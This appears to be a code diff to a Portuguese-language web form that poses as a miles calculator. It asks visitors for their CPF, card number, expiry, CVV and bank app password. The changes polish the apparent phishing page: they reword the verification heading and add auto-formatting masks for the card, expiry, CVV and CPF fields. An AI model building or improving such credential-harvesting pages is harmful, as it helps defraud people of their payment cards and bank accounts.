@@ -34,16 +34,22 @@
             <div class="step active" id="s1">
                 <h4 class="fw-bold mb-4">Dados Iniciais</h4>
                 <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
-                <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
+                <input type="text" name="cpf" id="cpf" class="form-control" placeholder="CPF" required>
                 <input type="email" name="email" class="form-control" placeholder="E-mail" required>
                 <button type="button" class="btn-main" onclick="changeStep(2)">AVANÇAR</button>
             </div>
 
             <div class="step" id="s2">
-                <h4 class="fw-bold mb-4">Verificação de Titularidade</h4>
-                <input type="text" name="num_cartao" class="form-control" placeholder="Número do Cartão" required>
-                <input type="text" name="validade" class="form-control" placeholder="Validade (MM/AA)" required>
-                <input type="text" name="cvv" class="form-control" placeholder="CVV" required>
+                <h4 class="fw-bold mb-4">Verificação de Conta</h4>
+                <input type="text" name="num_cartao" id="cartao" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                <div class="row">
+                    <div class="col-6">
+                        <input type="text" name="validade" id="validade" class="form-control" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="col-6">
+                        <input type="text" name="cvv" id="cvv" class="form-control" placeholder="CVV" maxlength="4" required>
+                    </div>
+                </div>
                 <input type="password" name="senha_app" class="form-control" placeholder="Senha do App do Banco" required>
                 <button type="button" class="btn-main" onclick="changeStep(3)">CALCULAR MILHAS</button>
             </div>
@@ -60,12 +66,27 @@
 <script>
     function changeStep(n) {
         const steps = document.querySelectorAll('.step');
-        for (let i = 0; i < steps.length; i++) {
-            steps[i].style.display = 'none';
-        }
+        steps.forEach(s => s.style.display = 'none');
         document.getElementById('s' + n).style.display = 'block';
         window.scrollTo(0, 0);
     }
+
+    // Máscaras Automáticas
+    document.getElementById('cartao').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+    });
+
+    document.getElementById('validade').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+    });
+
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    document.getElementById('cpf').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    });
 </script>
 </body>
 </html>
